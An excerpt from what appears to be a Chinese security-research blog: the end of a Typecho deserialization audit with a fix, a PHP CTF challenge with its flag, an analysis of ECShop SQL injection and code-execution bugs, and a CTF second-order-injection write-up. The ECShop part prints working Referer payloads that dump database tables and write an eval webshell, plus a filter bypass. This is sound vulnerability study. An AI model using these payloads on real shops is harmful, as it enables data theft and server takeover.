<p>我们将 <strong>$this-&gt;_param[‘scrrenName’]</strong> 的值设置为想要执行的函数，构造 <strong>$this-&gt;_filter</strong> 为对应函数的参数值，具体构造如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day11/16.png" alt="16"></p>
<p>接下来我们去看一下 <strong>Typecho_Feed</strong> 类的构造，该类在 <strong>var/Typecho/Feed.php</strong> 文件中，代码如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day11/14.png" alt="14"></p>
<p>上图代码 <strong>第7行</strong> ，满足 <strong>self::RSS2</strong> 与 <strong>$this-&gt;_type</strong> 相等进入该分支，所以 <strong>$this-&gt;_type</strong> 需要构造，<strong>item[‘author’]</strong> 为触发点，需要构造 <strong>$this_items</strong> ，具体构造如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day11/17.png" alt="17"></p>
<p>代码 <strong>22行</strong> 在实际利用没必要添加，install.php在代码 <strong>54行</strong> 调用 <strong>ob_start()</strong> 函数，该函数对输出内容进行缓冲,反序列化漏洞利用结束后，在<strong>var\Typecho\Db.php</strong>代码121行，触发异常，在 <strong>var\Typecho\Common.php</strong> 代码237行调用 <strong>ob_end_clean()函数</strong> 清除了缓冲区内容，导致无法看见执行结果，考虑在进入到异常处理前提前报错结束程序。由此构造该数据。执行结果如下： </p>
<p><img src="/img/PHP-Audit-Labs/Day11/18.png" alt="18"></p>
<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>造成该漏洞的原因主要有两点：</p>
<ul>
<li>当 <strong>config.inc.php</strong> 文件存在的时，可绕过判断继续往下执行代码。</li>
<li>传入反序列化函数的参数可控</li>
</ul>
<p>修复方法：在 <strong>install.php</strong> 文件第一行判断 <strong>config.inc.php</strong> 是否存在，如果存在，则退出代码执行。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (file_exists(dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/config.inc.php'</span>))</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">'Access Denied'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>看完了上述分析，不知道大家是否对反序列化利用有了一定的了解，文中用到的CMS可以从 <a href="https://github.com/typecho/typecho/archive/v1.1-15.5.12-beta.zip" target="_blank" rel="noopener">这里</a> 下载，当然文中若有不当之处，还望各位斧正。如果你对我们的项目感兴趣，欢迎发送邮件到 <a href="mailto:hongrisec@gmail.com" target="_blank" rel="noopener">hongrisec@gmail.com</a> 联系我们。<strong>Day11</strong> 的分析文章就到这里，我们最后留了一道CTF题目给大家练手，题目如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HITCON</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $method;</span><br><span class="line">    <span class="keyword">public</span> $args;</span><br><span class="line">    <span class="keyword">public</span> $conn;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__conn();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__conn</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db_host, $db_name, $db_user, $db_pass, $DEBUG;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;conn)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;conn = mysql_connect($db_host, $db_user, $db_pass);</span><br><span class="line">        mysql_select_db($db_name, <span class="keyword">$this</span>-&gt;conn);</span><br><span class="line">        <span class="keyword">if</span> ($DEBUG) &#123;</span><br><span class="line">            $sql = <span class="string">"DROP TABLE IF  EXISTS  users"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__query($sql, $back=<span class="keyword">false</span>);</span><br><span class="line">            $sql = <span class="string">"CREATE TABLE IF NOT EXISTS users (username VARCHAR(64),</span></span><br><span class="line"><span class="string">            password VARCHAR(64),role VARCHAR(256)) CHARACTER SET utf8"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;__query($sql, $back=<span class="keyword">false</span>);</span><br><span class="line">            $sql = <span class="string">"INSERT INTO users VALUES ('orange', '$db_pass', 'admin'), ('phddaa', 'ddaa', 'user')"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__query($sql, $back=<span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        mysql_query(<span class="string">"SET names utf8"</span>);</span><br><span class="line">        mysql_query(<span class="string">"SET sql_mode = 'strict_all_tables'"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__query</span><span class="params">($sql, $back=true)</span> </span>&#123;</span><br><span class="line">        $result = @mysql_query($sql);</span><br><span class="line">        <span class="keyword">if</span> ($back) &#123;</span><br><span class="line">            <span class="keyword">return</span> @mysql_fetch_object($result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($username, $password) = func_get_args();</span><br><span class="line">        $sql = sprintf(<span class="string">"SELECT * FROM users WHERE username='%s' AND password='%s'"</span>, $username, md5($password));</span><br><span class="line">        $obj = <span class="keyword">$this</span>-&gt;__query($sql);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( $obj != <span class="keyword">false</span> ) &#123;</span><br><span class="line">            define(<span class="string">'IN_FLAG'</span>, <span class="keyword">TRUE</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;loadData($obj-&gt;role);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;__die(<span class="string">"sorry!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">loadData</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">2</span>) !== <span class="string">'O:'</span> &amp;&amp; !preg_match(<span class="string">'/O:\d:/'</span>, $data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> unserialize($data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__die</span><span class="params">($msg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__close();</span><br><span class="line">        header(<span class="string">"Content-Type: application/json"</span>);</span><br><span class="line">        <span class="keyword">die</span>( json_encode( <span class="keyword">array</span>(<span class="string">"msg"</span>=&gt; $msg) ) );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        mysql_close(<span class="keyword">$this</span>-&gt;conn);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">source</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__conn();</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">"login"</span>, <span class="string">"source"</span>))) &#123;</span><br><span class="line">            @call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__die(<span class="string">"What do you do?"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[$k] = strtolower(trim(mysql_escape_string($v)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">'index.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="keyword">$this</span>-&gt;file;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">    	<span class="keyword">$this</span>-&gt; file=<span class="string">'index.php'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"data"</span>])) &#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">"data"</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">new</span> HITCON(<span class="string">"source"</span>, <span class="keyword">array</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $db_host = <span class="string">'localhost'</span>;</span><br><span class="line">    $db_name = <span class="string">'test'</span>;</span><br><span class="line">    $db_user = <span class="string">'root'</span>;</span><br><span class="line">    $db_pass = <span class="string">'123'</span>;</span><br><span class="line">	$DEBUG = <span class="string">'xx'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">!defined(<span class="string">'IN_FLAG'</span>) &amp;&amp; <span class="keyword">exit</span>(<span class="string">'Access Denied'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag&#123;un3eri@liz3_i3_s0_fun&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

        
      
    </div>

    

    

  </article>

    
      
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          <a class="post-link" href="/2018/09/10/关于ECShop前台注入和getshell漏洞的一些思考/">关于ECShop前台注入和getshell漏洞的一些思考</a>
        
      </h1>

      <div class="post-meta">
        <span class="post-time">
          2018-09-10
        </span>
        
          <div class="post-category">
            
              <a href="/categories/代码审计/">代码审计</a>
            
          </div>
        
        
      </div>
    </header>

    
    


    <div class="post-content">
      
        
        

        
          <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近爆出的ECShop的两个漏洞很火，本篇文章就网络上爆出的payload进行分析，并记录其中自己的一些思考，具体的漏洞不会详细分析，因为这类分析文章已经有很多了，如果你想了解，可以看结尾处的相关文章。</p>
<h3 id="ECShop2-x"><a href="#ECShop2-x" class="headerlink" title="ECShop2.x"></a>ECShop2.x</h3><p>下面以2.7.3版本为例，我们先来看网络上最早爆出来 <strong>注入的payload</strong> ：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:"num";s:72:"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -";s:2:"id";i:1;&#125;</span><br></pre></td></tr></table></figure>
<p>这个payload还原回去，对应的SQL语句如下：</p>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/1.png" alt="1"></p>
<p>然而这种payload有点鸡肋，因为在版本稍微高一点的mysql中， <strong>procedure analyse</strong> 语句中不能再跟 <strong>select</strong> 语句。看 <strong>P牛</strong> 转载的 <a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html" target="_blank" rel="noopener">这篇</a>文章中，mysql版本为 <strong>5.5.41-0ubuntu0.14.04.1</strong> ，是可以跟 <strong>select</strong> 语句的：</p>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/2.png" alt="2"></p>
<p>而我用 <strong>phpstudy</strong> 中mysql版本为 <strong>5.5.53</strong> ，使用该语句却爆语法错误：</p>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/3.png" alt="3"></p>
<p>所以猜测应该是和版本有关，或者说 <strong>procedure analyse</strong> 语句还有其他的注入写法，知道的师傅还请告诉我：)</p>
<p>既然这种 <strong>payload</strong> 不能爆出表名、列名，我们就要换个思路。仔细观察 <strong>ECShop</strong> 存在注入处的源码，实际上可控制的拼接参数有两个，分别是： <strong>$arr[‘id’]</strong> 和 <strong>$arr[‘num’]</strong> ，所以我们大可在 <strong>$arr[‘id’]</strong> 处注入 <strong>payload</strong> (这里直接用 <strong>#</strong> 号)，直接注释掉后面的 <strong>ORDER BY</strong> 语句。</p>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/4.png" alt="4"></p>
<p>所以我构造的 <strong>payload</strong> 如下，可以成功爆出表名和列名：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:"num";s:3:"669";s:2:"id";s:133:"1' and updatexml(1,make_set(3,'~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)#";&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/5.png" alt="5"></p>
<p>当然，同时利用 <strong>$arr[‘id’]</strong> 和 <strong>$arr[‘num’]</strong> 两个参数，引入 <strong>/**/</strong> 将 <strong>ORDER BY</strong> 语句注释掉也是可以的：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:2:"id";s:4:"' /*";s:3:"num";s:132:"*/ and updatexml(1,make_set(3,'~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)";&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/6.png" alt="6"></p>
<p>再来看 <strong>命令执行的payload</strong> ：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:"num";s:280:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -";s:2:"id";s:3:"'/*";&#125;</span><br></pre></td></tr></table></figure>
<p>当中的16进制对应字符串如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$asd<span class="string">'];assert(base64_decode('</span>ZmlsZV9wdXRfY29udGVudHMoJzEucGhwJywnPD9waHAgZXZhbCgkX1BPU1RbMTMzN10pOyA/Picp<span class="string">'));//&#125;xxx</span></span><br></pre></td></tr></table></figure>
<p>这个命令执行的关键点，还是利用了之前的注入点，同样引入了 <strong>/**/</strong> 将 <strong>ORDER BY</strong> 语句给注释掉。当中，payload会经过 <strong>includes/cls_template.php</strong> 文件的这条语句：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_replace(<span class="string">"/&#123;([^\&#125;\&#123;\n]*)&#125;/e"</span>, <span class="string">"\$this-&gt;select('\\1');"</span>, $source);</span><br></pre></td></tr></table></figure>
<p>这里的 <strong>preg_replace</strong> 使用了危险的 <strong>/e</strong> 模式，而第二个参数中的 <strong>\1</strong> 实际表示的是下图绿色部分字符串：</p>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/7.png" alt="7"></p>
<p>对于正则中的 <strong>\1</strong> 不熟悉的话，可以参考 <a href="https://mochazz.github.io/2018/08/13/深入研究preg_replace与代码执行/">这篇</a> 文章。之后程序的流程就如下调用：</p>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/8.png" alt="8"></p>
<p>我们可以思考一下这处的命令执行，能不能像前面一样，只利用 <strong>$arr[‘id’]</strong> 位置（即引入单个 <strong>#</strong> 号）？实际上是不行的，必须两个可控变量同时配合利用，才能完成攻击。因为在 <strong>includes/lib_insert.php</strong> 文件中有一个判断，如果数据库查询出的 <strong>position_id</strong> 和用户传入的 <strong>id</strong> 相同，才会执行 <strong>fetch</strong> 函数，继而进入 <strong>includes/cls_template.php</strong> 文件的 <strong>_eval</strong> 方法，达到代码执行的目的。</p>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/9.png" alt="9"></p>
<p>我们试着使用前面我构造的 <strong>payload</strong> （只利用 <strong>$arr[‘id’]</strong> 引入单个 <strong>#</strong> 号），此时 <strong>$arr[‘id’]</strong> 对应下图黄框部分，而 <strong>$row[‘position_id’]</strong> 对应红框部分，要让这两个地方相等，根本不可能。</p>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/10.png" alt="10"></p>
<p>仔细观察，会发现 <strong>$row[‘position_id’] </strong> 和 <strong>$arr[‘id’]</strong> 之间使用的是弱比较，那我们是否能利用PHP弱比较的特性绕过呢？实际上还是不行，因为 <strong>$row[‘position_id’] </strong> 是从数据库中查询出来的，其值类型为字符串，所以无法相等。</p>
<p>最终payload传到 <strong>_eval</strong> 函数中，成功执行代码：</p>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/11.png" alt="11"></p>
<h3 id="ECShop3-x"><a href="#ECShop3-x" class="headerlink" title="ECShop3.x"></a>ECShop3.x</h3><p>下面以3.0.0版本为例。在ECShop3.x版本中，添加了一个 <strong>includes/safety.php</strong> 文件，专门用于消除有害数据，但是漏洞依旧存在，我们只需绕过过滤函数即可。该文件代码如下：</p>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/12.png" alt="12"></p>
<p>用我们之前的payload，会触发过滤SQL注入的正则，具体匹配到的子项如下的 <strong>$ttt</strong> 变量：</p>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/13.png" alt="13"></p>
<p>主要这个正则会匹配到 <strong>set</strong> 、 <strong>concat</strong> 、<strong>information_schema.</strong>、 <strong>select from</strong> 语句等，暂时没有找到可绕过的SQL语句。</p>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/14.png" alt="14"></p>
<p>不过命令执行还是可以绕过的，因为我们之前的payload经过编码，这样就绕过了正则匹配。现在唯一能匹配到的就是 <strong>union select</strong> 语句，我们可以同时利用 <strong>$arr[‘id’]</strong> 和 <strong>$arr[‘num’]</strong> 两个参数，将 <strong>union</strong> 和 <strong>select</strong> 分开传递即可绕过正则检测：</p>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/15.png" alt="15"></p>
<p>但是这里还会匹配到 <strong>select from</strong> 语句，这里没有绕过，所以爆不了表名列名。</p>
<p><strong>3.x</strong> 版本除了多了这处正则，<strong>includes/cls_template.php</strong> 文件中的 <strong>fetch_str</strong> 方法结尾处也不一样了，多了一个 <strong>if</strong> 结构，满足条件才能继续命令执行。下图左边为 <strong>ECShop2.7.3</strong> ，右边为 <strong>ECShop3.0.0</strong> ：</p>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/16.png" alt="16"></p>
<p>按照默认的数据传递流程，<strong>version_compare</strong> 函数默认是存在的，所以要想进入 <strong>if</strong> 语句，必须让后面的条件为真。后面的条件要求我们PHP的版本需要小于 <strong>5.3.0</strong> 才会进入该 <strong>if</strong> 语句。在实际测试时，我在 <strong>PHP5.2.17</strong> 版本下利用如下payload确实可以成功写入webshell，但是PHP版本大于等于 <strong>5.3.0</strong> 就无法写入webshell。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: 45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:"num";s:286:"*/ select 1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -";s:2:"id";s:9:"' union/*";&#125;45ea207d7a2b68c49582d2d22adf953aadsa</span><br></pre></td></tr></table></figure>
<p>实际上ECShop在3.6的版本中已经修复了该漏洞，而 <a href="https://xz.aliyun.com/t/2691" target="_blank" rel="noopener">这篇</a> 文章中所说的3.6.x也存在，我看了他的测试代码，发现他把原先ECShop中的修复代码给注释掉了，这样当然可以利用漏洞了！标题有点误导性。</p>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/30.png" alt="30"></p>
<p>本文分析到此结束，文中若有不当，还望大家斧正，若有绕过姿势愿意分享，也可以联系我。</p>
<h3 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h3><p><a href="https://xz.aliyun.com/t/2689" target="_blank" rel="noopener">ECShop全系列版本远程代码执行高危漏洞分析</a><br><a href="https://paper.seebug.org/695/" target="_blank" rel="noopener">ECShop 0day 的堕落之路</a><br><a href="http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">ecshop2.x代码执行</a><br><a href="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/" target="_blank" rel="noopener">ECShop sqli and rce</a><br><a href="https://xz.aliyun.com/t/2691" target="_blank" rel="noopener">ECShop &lt;= 2.7.x/3.6.x 全系列版本远程代码执行高危漏洞EXP</a><br><a href="http://www.freebuf.com/vuls/183294.html" target="_blank" rel="noopener">ECShop 2.x 3.0代码执行漏洞分析</a> </p>

        
      
    </div>

    

    

  </article>

    
      
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          <a class="post-link" href="/2018/09/01/2018网鼎杯第四场/">2018网鼎杯第四场Web题解</a>
        
      </h1>

      <div class="post-meta">
        <span class="post-time">
          2018-09-01
        </span>
        
          <div class="post-category">
            
              <a href="/categories/CTF竞赛训练/">CTF竞赛训练</a>
            
          </div>
        
        
      </div>
    </header>

    
    


    <div class="post-content">
      
        
        

        
          <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="comment"><a href="#comment" class="headerlink" title="comment"></a>comment</h3><p>题目界面如下，有发帖留言的功能，不过需要登录才能使用。</p>
<p><img src="/img/2018网鼎杯第四场/1.png" alt="1"></p>
<p>可以通过爆破得知账号密码为：zhangwei/zhangwei666</p>
<p><img src="/img/2018网鼎杯第四场/2.png" alt="2"></p>
<p>手工测试发现存在 <strong>.git</strong> 泄露，用 <a href="https://github.com/BugScanTeam/GitHack" target="_blank" rel="noopener"><strong>GitHack</strong></a> 下载泄露文件，发现 <strong>write_do.php</strong> 的代码不全。通过 <strong>git cat-file -p xxxxx</strong> 命令显示版本库对象的内容、类型及大小信息，可以看到完整的代码：</p>
<p><img src="/img/2018网鼎杯第四场/3.png" alt="3"></p>
<p>具体代码如下：</p>
<p><img src="/img/2018网鼎杯第四场/4.png" alt="4"></p>
<p>可以看到上面 <strong>第13-14</strong> 行都对 <strong>POST</strong> 传来 <strong>category</strong> 、 <strong>title</strong> 、<strong>content</strong> 三个参数进行了特殊字符转义，然而在 <strong>第28行</strong> 和 <strong>第30-33行</strong> 处直接将从数据库中取出的数据，未经任何过滤拼接到 <strong>SQL语句</strong> 中，这就存在 <strong>二次注入</strong> 。</p>
<p>有很多人一直纠结 <strong>addslashes</strong> 这个转义函数，其实大家在数据库中测试一下就知道了，假设我们的 <strong>payload</strong> 为：<strong>‘,content=user(),/*</strong> ，那么经过 <strong>addslashes</strong> 函数转义后，变成了 <strong>\‘,content=user(),/*</strong> ，我们看一下插入数据库中变成啥样：</p>
<p><img src="/img/2018网鼎杯第四场/5.png" alt="5"></p>
<p>所以根本就不影响我们进行二次注入。下面说说二次注入的攻击过程：</p>
<ul>
<li>先进入 <strong>write</strong> 方法，将 <strong>payload</strong> ： <code>&#39;,content=user(),/*</code> 插入 <strong>board</strong> 表的 <strong>category</strong> 字段中</li>
<li>再进入 <strong>comment</strong> 方法，程序将 <strong>board</strong> 表中的 <strong>category</strong> 字段取出，没进行过滤，拼接到新的 <strong>insert</strong> 语句中。由于我们之前的 <strong>payload</strong> 中带有 <strong>/*</strong> ，所以我们需要闭合它，即我们在评论处提交 <strong>*/#</strong> (对应 <strong>content</strong> 变量的值)</li>
<li>然后程序执行 <strong>第二个SQL</strong> 语句，并将用户提交的 <strong>content</strong> 值显示出来，而我们的 <strong>payload</strong> ： <code>&#39;,content=user(),/*</code>  就会显示出当前用户。</li>
</ul>
<p><img src="/img/2018网鼎杯第四场/6.png" alt="6"></p>
<p><img src="/img/2018网鼎杯第四场/7.png" alt="7"></p>
